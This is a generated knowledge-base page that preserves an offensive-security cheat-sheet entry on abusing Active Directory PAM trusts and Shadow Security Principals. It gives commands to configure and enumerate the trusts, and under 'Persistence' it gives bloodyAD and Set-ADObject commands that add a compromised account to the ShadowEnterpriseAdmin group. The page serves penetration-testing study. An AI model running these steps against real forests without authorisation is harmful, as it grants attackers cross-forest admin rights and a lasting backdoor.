---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Trust - Privileged Access Management

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-trust-pam` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/trust-pam.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs

## Preserved Body

````markdown
> PAM (Privileged Access Management) introduces bastion forest for management, Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests without making changes to groups or ACLs and without interactive logon.

Requirements:

* Windows Server 2016 or earlier

If we compromise the bastion we get `Domain Admins` privileges on the other domain

* Default configuration for PAM Trust

    ```ps1
    # execute on our forest
    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes 
    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes 
    netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes 
    netdom trust lab.local /domain:bastion.local /Quarantine:No
    # execute on our bastion
    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes
    ```

* Enumerate PAM trusts

    ```ps1
    # Detect if current forest is PAM trust
    Import ADModule
    Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}

    # Enumerate shadow security principals 
    Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

    # Enumerate if current forest is managed by a bastion forest
    # Trust_Attribute_PIM_Trust + Trust_Attribute_Treat_As_External
    Get-ADTrust -Filter {(ForestTransitive -eq $True)} 
    ```

* Compromise
    * Using the previously found Shadow Security Principal (WinRM account, RDP access, SQL, ...)
    * Using SID History
* Persistence
    * Windows/Linux:

    ```ps1
    bloodyAD --host 10.1.0.4 -u john.doe -p 'Password123!' -d bloody add groupMember 'CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local' Administrator
    ```

    * Windows only:

    ```ps1
    # Add a compromised user to the group 
    Set-ADObject -Identity "CN=forest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=domain,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=domain,DC=local"}
    ```

## References

* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
````

## Source Verification

[source record](../../sources/internalallthethings/trust-privileged-access-management.md)

## Evidence Excerpt

````text
_body: "# Trust - Privileged Access Management\n\n> PAM (Privileged Access Management) introduces bastion forest for management,\
\ Shadow Security Principals (groups mapped to high priv groups of managed forests). These allow management of other forests\
\ without making changes to groups or ACLs and without interactive logon.\n\nRequirements:\n\n* Windows Server 2016 or earlier\n\
\nIf we compromise the bastion we get `Domain Admins` privileges on the other domain\n\n* Default configuration for PAM\
\ Trust\n\n    ```ps1\n    # execute on our forest\n    netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes\
\ \n    netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes \n    netdom trust lab.local /domain:bastion.local\
\ /EnablePIMTrust:Yes \n    netdom trust lab.local /domain:bastion.local /Quarantine:No\n    # execute on our bastion\n\
\    netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes\n    ```\n\n* Enumerate PAM trusts\n\n    ```ps1\n\
````
